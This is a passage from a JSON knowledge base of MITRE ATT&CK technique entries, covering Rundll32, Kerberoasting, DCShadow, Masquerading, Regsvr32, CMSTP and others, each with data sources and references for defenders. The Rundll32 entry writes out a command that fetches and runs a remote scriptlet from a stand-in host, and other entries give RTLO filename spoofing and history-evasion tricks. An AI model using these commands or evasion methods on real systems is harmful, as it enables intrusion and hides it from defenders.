      "description": "The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\n\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)",
      "meta": {
        "external_id": "T1085",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters",
          "Binary file metadata"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1085",
          "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf",
          "https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/"
        ]
      },
      "uuid": "62b8c999-dcc0-4755-bd69-09442d9359f5",
      "value": "Rundll32 - T1085"
    },
    {
      "description": "A type-1 hypervisor is a software layer that sits between the guest operating systems and system's hardware. (Citation: Wikipedia Hypervisor) It presents a virtual running environment to an operating system. An example of a common hypervisor is Xen. (Citation: Wikipedia Xen) A type-1 hypervisor operates at a level below the operating system and could be designed with [Rootkit](https://attack.mitre.org/techniques/T1014) functionality to hide its existence from the guest operating system. (Citation: Myers 2007) A malicious hypervisor of this nature could be used to persist on systems through interruption.",
      "meta": {
        "external_id": "CAPEC-552",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "System calls"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1062",
          "https://capec.mitre.org/data/definitions/552.html",
          "http://en.wikipedia.org/wiki/Xen",
          "http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.90.8832&rep=rep1&type=pdf",
          "http://virtualization.info/en/news/2006/08/debunking-blue-pill-myth.html",
          "https://en.wikipedia.org/wiki/Hypervisor"
        ]
      },
      "uuid": "4be89c7c-ace6-4876-9377-c8d54cef3d63",
      "value": "Hypervisor - T1062"
    },
    {
      "description": "DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a Domain Controller (DC). (Citation: DCShadow Blog) (Citation: BlueHat DCShadow Jan 2018) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1178) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog) (Citation: BlueHat DCShadow Jan 2018)",
      "meta": {
        "external_id": "T1207",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "Authentication logs",
          "Network protocol analysis",
          "Packet capture"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1207",
          "https://www.dcshadow.com/",
          "https://adsecurity.org/?page_id=1821",
          "https://github.com/shellster/DCSYNCMonitor",
          "https://adds-security.blogspot.fr/2018/02/detecter-dcshadow-impossible.html",
          "https://msdn.microsoft.com/en-us/library/ms677626.aspx"
        ]
      },
      "uuid": "564998d8-ab3e-4123-93fb-eccaa6b9714a",
      "value": "DCShadow - T1207"
    },
    {
      "description": "Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service (Citation: Microsoft Detecting Kerberoasting Feb 2018)). (Citation: Microsoft SPN) (Citation: Microsoft SetSPN) (Citation: SANS Attacking Kerberos Nov 2014) (Citation: Harmj0y Kerberoast Nov 2016)\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). (Citation: Empire InvokeKerberoast Oct 2016) (Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials. (Citation: AdSecurity Cracking Kerberos Dec 2015) (Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\n\nThis same attack could be executed using service tickets captured from network traffic. (Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nCracked hashes may enable Persistence, Privilege Escalation, and  Lateral Movement via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078). (Citation: SANS Attacking Kerberos Nov 2014)",
      "meta": {
        "external_id": "T1208",
        "kill_chain": [
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "Windows event logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1208",
          "https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/",
          "https://msdn.microsoft.com/library/ms677949.aspx",
          "https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx",
          "https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/",
          "https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1",
          "https://adsecurity.org/?p=2293"
        ]
      },
      "uuid": "b39d03cb-7b98-41c4-a878-c40c1a913dc0",
      "value": "Kerberoasting - T1208"
    },
    {
      "description": "Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. Several different variations of this technique have been observed.\n\nOne variant is for an executable to be placed in a commonly trusted directory or given the name of a legitimate, trusted program. Alternatively, the filename given may be a close approximation of legitimate programs or something innocuous. An example of this is when a common system utility or program is moved and renamed to avoid detection based on its usage.(Citation: FireEye APT10 Sept 2018) This is done to bypass tools that trust executables by relying on file name or path, as well as to deceive defenders and system administrators into thinking a file is benign by associating the name with something that is thought to be legitimate.\n\nA third variant uses the right-to-left override (RTLO or RLO) character (U+202E) as a means of tricking a user into executing what they think is a benign file type but is actually executable code. RTLO is a non-printing character that causes the text that follows it to be displayed in reverse.(Citation: Infosecinstitute RTLO Technique) For example, a Windows screensaver file named <code>March 25 \\u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>. A common use of this technique is with spearphishing attachments since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default. \n\nAdversaries may modify a binary's metadata, including such fields as icons, version, name of the product, description, and copyright, to better blend in with the environment and increase chances of deceiving a security analyst or product.(Citation: Threatexpress MetaTwin 2017)\n\n### Windows\nIn another variation of this technique, an adversary may use a renamed copy of a legitimate utility, such as rundll32.exe. (Citation: Endgame Masquerade Ball) An alternative case occurs when a legitimate utility is moved to a different directory and also renamed to avoid detections based on system utilities executing from non-standard paths. (Citation: F-Secure CozyDuke)\n\nAn example of abuse of trusted locations in Windows would be the <code>C:\\Windows\\System32</code> directory. Examples of trusted binary names that can be given to malicious binares include \"explorer.exe\" and \"svchost.exe\".\n\n### Linux\nAnother variation of this technique includes malicious binaries changing the name of their running process to that of a trusted or benign process, after they have been launched as opposed to before. (Citation: Remaiten)\n\nAn example of abuse of trusted locations in Linux  would be the <code>/bin</code> directory. Examples of trusted binary names that can be given to malicious binaries include \"rsyncd\" and \"dbus-inotifier\". (Citation: Fysbis Palo Alto Analysis)  (Citation: Fysbis Dr Web Analysis)",
      "meta": {
        "external_id": "CAPEC-177",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Binary file metadata"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1036",
          "https://capec.mitre.org/data/definitions/177.html",
          "https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html",
          "https://resources.infosecinstitute.com/spoof-using-right-to-left-override-rtlo-technique-2/",
          "https://blog.trendmicro.com/trendlabs-security-intelligence/plead-targeted-attacks-against-taiwanese-government-agencies-2/",
          "https://securelist.com/zero-day-vulnerability-in-telegram/83800/",
          "https://threatexpress.com/blogs/2017/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/",
          "https://www.endgame.com/blog/how-hunt-masquerade-ball",
          "https://www.f-secure.com/documents/996508/1030745/CozyDuke",
          "https://www.welivesecurity.com/2016/03/30/meet-remaiten-a-linux-bot-on-steroids-targeting-routers-and-potentially-other-iot-devices/",
          "https://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/",
          "https://vms.drweb.com/virus/?i=4276269",
          "https://twitter.com/ItsReallyNick/status/1055321652777619457"
        ]
      },
      "uuid": "42e8de7b-37b2-4258-905a-6897815e58e0",
      "value": "Masquerading - T1036"
    },
    {
      "description": "Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also be in the form of command-line batch scripts.\n\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them.\n\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)",
      "meta": {
        "external_id": "T1064",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "File monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1064",
          "http://www.metasploit.com",
          "https://www.veil-framework.com/framework/",
          "https://github.com/mattifestation/PowerSploit",
          "https://blog.crowdstrike.com/deep-thought-chinese-targeting-national-security-think-tanks/",
          "https://www.uperesia.com/analyzing-malicious-office-documents"
        ]
      },
      "uuid": "7fd87010-3a00-4da3-b905-410525e8ec44",
      "value": "Scripting - T1064"
    },
    {
      "description": "A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)\n\nAdversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\n### Master Boot Record\nThe MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)\n\n### Volume Boot Record\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",
      "meta": {
        "external_id": "T1067",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "MBR",
          "VBR"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1067",
          "https://www.fireeye.com/content/dam/fireeye-www/regional/fr_FR/offers/pdfs/ig-mtrends-2016.pdf",
          "http://www.symantec.com/connect/blogs/are-mbr-infections-back-fashion"
        ]
      },
      "uuid": "02fefddc-fb1b-423f-a76b-7552dd211d4d",
      "value": "Bootkit - T1067"
    },
    {
      "description": "PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. \n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nAdministrator permissions are required to use PowerShell to connect to remote systems.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)",
      "meta": {
        "external_id": "T1086",
        "kill_chain": [
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "PowerShell logs",
          "Loaded DLLs",
          "DLL monitoring",
          "Windows Registry",
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1086",
          "https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx",
          "https://github.com/mattifestation/PowerSploit",
          "https://github.com/jaredhaight/PSAttack",
          "http://www.sixdub.net/?p=367",
          "https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/",
          "https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/",
          "http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf",
          "https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html"
        ]
      },
      "uuid": "f4882e23-8aa7-4b12-b28a-b349c12ee9e0",
      "value": "PowerShell - T1086"
    },
    {
      "description": "Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools. Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools. (Citation: WindowsIR Anti-Forensic Techniques)",
      "meta": {
        "external_id": "T1099",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1099",
          "http://windowsir.blogspot.com/2013/07/howto-determinedetect-use-of-anti.html"
        ]
      },
      "uuid": "128c55d3-aeba-469f-bd3e-c8996ab4112a",
      "value": "Timestomp - T1099"
    },
    {
      "description": "Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)\n\nAdversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.\n\nRegsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1122). (Citation: Carbon Black Squiblydoo Apr 2016)",
      "meta": {
        "external_id": "T1117",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "Loaded DLLs",
          "Process monitoring",
          "Windows Registry",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1117",
          "https://support.microsoft.com/en-us/kb/249873",
          "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/",
          "https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/",
          "https://www.fireeye.com/blog/threat-research/2017/02/spear_phishing_techn.html"
        ]
      },
      "uuid": "68f7e3a1-f09f-4164-9a62-16b648a0dd5a",
      "value": "Regsvr32 - T1117"
    },
    {
      "description": "InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil is located in the .NET directories on a Windows system: <code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> and <code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>. InstallUtil.exe is digitally signed by Microsoft.\n\nAdversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil)",
      "meta": {
        "external_id": "T1118",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1118",
          "https://msdn.microsoft.com/en-us/library/50614e95.aspx",
          "https://lolbas-project.github.io/lolbas/Binaries/Installutil/"
        ]
      },
      "uuid": "f792d02f-813d-402b-86a5-ab98cb391d3b",
      "value": "InstallUtil - T1118"
    },
    {
      "description": "The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1117) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft application.\n\nCMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)",
      "meta": {
        "external_id": "T1191",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Process command-line parameters",
          "Process use of network",
          "Windows event logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1191",
          "https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc786431(v=ws.10)",
          "https://twitter.com/ItsReallyNick/status/958789644165894146",
          "https://msitpros.com/?p=3960",
          "https://twitter.com/NickTyrer/status/958450014111633408",
          "https://github.com/api0cradle/UltimateAppLockerByPassList",
          "http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/"
        ]
      },
      "uuid": "7d6f590f-544b-45b4-9a42-e0805f342af3",
      "value": "CMSTP - T1191"
    },
    {
      "description": "Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in <code>~/Library/Keychains/</code>,<code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>. (Citation: Wikipedia keychain) The <code>security</code> command-line utility, which is built into macOS by default, provides a useful way to manage these credentials.\n\nTo manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault. (Citation: External to DA, the OS X Way) By default, the passphrase for the keychain is the user’s logon credentials.",
      "meta": {
        "external_id": "T1142",
        "kill_chain": [
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "System calls",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1142",
          "https://en.wikipedia.org/wiki/Keychain_(software)",
          "http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way"
        ]
      },
      "uuid": "9e09ddb2-1746-4448-9cad-7f8b41777d6d",
      "value": "Keychain - T1142"
    },
    {
      "description": "Launchctl controls the macOS launchd process which handles things like launch agents and launch daemons, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input. By loading or reloading launch agents or launch daemons, adversaries can install persistence or execute changes they made  (Citation: Sofacy Komplex Trojan). Running a command from launchctl is as simple as <code>launchctl submit -l <labelName> -- /Path/to/thing/to/execute \"arg\" \"arg\" \"arg\"</code>. Loading, unloading, or reloading launch agents or launch daemons can require elevated privileges. \n\nAdversaries can abuse this functionality to execute code or even bypass whitelisting if launchctl is an allowed process.",
      "meta": {
        "external_id": "T1152",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:execution",
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1152",
          "https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/"
        ]
      },
      "uuid": "53bfc8bf-8f76-4cd7-8958-49a884ddb3ee",
      "value": "Launchctl - T1152"
    },
    {
      "description": "The <code>source</code> command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways <code>source /path/to/filename [arguments]</code> or <code>. /path/to/filename [arguments]</code>. Take note of the space after the \".\". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment.(Citation: Source Manual)\n\nAdversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.",
      "meta": {
        "external_id": "T1153",
        "kill_chain": [
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "File monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1153",
          "https://ss64.com/bash/source.html"
        ]
      },
      "uuid": "45d84c8b-c1e2-474d-a14d-69b5de0a2bc0",
      "value": "Source - T1153"
    },
    {
      "description": "The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common  keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>. Adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where \"command list\" will be executed when \"signals\" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)",
      "meta": {
        "external_id": "T1154",
        "kill_chain": [
          "mitre-attack:execution",
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1154",
          "https://ss64.com/bash/trap.html",
          "https://bash.cyberciti.biz/guide/Trap_statement"
        ]
      },
      "uuid": "b53dbcc6-147d-48bb-9df4-bcb8bb808ff6",
      "value": "Trap - T1154"
    },
    {
      "description": "The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. This setting can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. Adversaries can use this to operate without leaving traces by simply prepending a space to all of their terminal commands.",
      "meta": {
        "external_id": "T1148",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Authentication logs",
          "File monitoring",
          "Environment variable"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1148"
        ]
      },
      "uuid": "086952c4-5b90-4185-b573-02bad8e11953",
      "value": "HISTCONTROL - T1148"
    },
    {
      "description": "Adversaries may modify visual content available internally or externally to an enterprise network. Reasons for Defacement include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. \n\n### Internal\nAn adversary may deface systems internal to an organization in an attempt to intimidate or mislead users. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster) Disturbing or offensive images may be used as a part of Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages. While internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)\n\n### External \nWebsites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.(Citation: FireEye Cyber Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) Defacement may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation: Trend Micro Deep Dive Into Defacement)\n",
      "meta": {
        "external_id": "T1491",
        "kill_chain": [
          "mitre-attack:impact"
        ],
        "mitre_data_sources": [
          "Packet capture",
          "Web application firewall logs",
          "Web logs",
          "Packet capture"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1491",
          "https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf",
          "https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf",
          "https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/ib-entertainment.pdf",
          "https://www.intelligence.senate.gov/sites/default/files/documents/os-kmandia-033017.pdf",
          "https://torrentfreak.com/anonymous-hackers-deface-russian-govt-site-to-protest-web-blocking-nsfw-180512/",
          "https://documents.trendmicro.com/assets/white_papers/wp-a-deep-dive-into-defacement.pdf"
        ]
      },
      "uuid": "5909f20f-3c39-4795-be06-ef1ea40d350b",
      "value": "Defacement - T1491"
    },
    {
      "description": "macOS and OS X applications send AppleEvent messages to each other for interprocess communications (IPC). These messages can be easily scripted with AppleScript for local or remote IPC. Osascript executes AppleScript and any other Open Scripting Architecture (OSA) language scripts. A list of OSA languages installed on a system can be found by using the <code>osalang</code> program.\nAppleEvent messages can be sent independently or as part of a script. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely. \n\nAdversaries can use this to interact with open SSH connection, move to remote machines, and even present users with fake dialog boxes. These events cannot start applications remotely (they can start them locally though), but can interact with applications if they're already running remotely. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via python  (Citation: Macro Malware Targets Macs). Scripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e \"script here\"</code>.",
      "meta": {
        "external_id": "T1155",
        "kill_chain": [
          "mitre-attack:execution",
          "mitre-attack:lateral-movement"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "System calls",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1155",
          "https://securingtomorrow.mcafee.com/mcafee-labs/macro-malware-targets-macs/"
        ]
      },
      "uuid": "5ad95aaa-49c1-4784-821d-2e83f47b079b",
      "value": "AppleScript - T1155"
    },
    {
